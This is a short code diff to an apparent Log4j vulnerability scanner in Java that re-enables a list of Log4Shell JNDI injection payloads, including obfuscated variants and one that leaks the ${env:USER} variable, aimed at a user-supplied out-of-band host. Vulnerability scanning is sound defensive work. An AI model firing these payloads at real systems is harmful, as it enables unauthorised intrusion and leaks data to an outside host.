@@ -36,15 +36,15 @@ public class log4jscanner {
             String oobPayload = scanner.nextLine();
             String[] payloads = new String[] {
                     "${jndi:ldap://" + oobPayload + "}",
-//                    "${jndi:ldaps://" + oobPayload + "}",
-//                    "${jndi:dns://" + oobPayload + "}",
-//                    "${jndi:rmi://" + oobPayload + "}",
-//                    "${j${lower:n}di:ldap://" + oobPayload + "}",
-//                    "${${::-j}${::-n}${::-d}${::-i}:ldap://" + oobPayload + "}",
-//                    "${jndi:ldap://" + oobPayload + "/a}",
-//                    "${jndi:ldap://" + oobPayload + "/cn=test}",
-//                    "${jndi:ldap://" + oobPayload + "/${env:USER}}",
-//                    "${${lower:j}${upper:n}${lower:d}i:rmi://" + oobPayload + "}"
+                    "${jndi:ldaps://" + oobPayload + "}",
+                    "${jndi:dns://" + oobPayload + "}",
+                    "${jndi:rmi://" + oobPayload + "}",
+                    "${j${lower:n}di:ldap://" + oobPayload + "}",
+                    "${${::-j}${::-n}${::-d}${::-i}:ldap://" + oobPayload + "}",
+                    "${jndi:ldap://" + oobPayload + "/a}",
+                    "${jndi:ldap://" + oobPayload + "/cn=test}",
+                    "${jndi:ldap://" + oobPayload + "/${env:USER}}",
+                    "${${lower:j}${upper:n}${lower:d}i:rmi://" + oobPayload + "}"
             };
 
             System.out.println("Enter the path to the file containing URLs (one per line):");
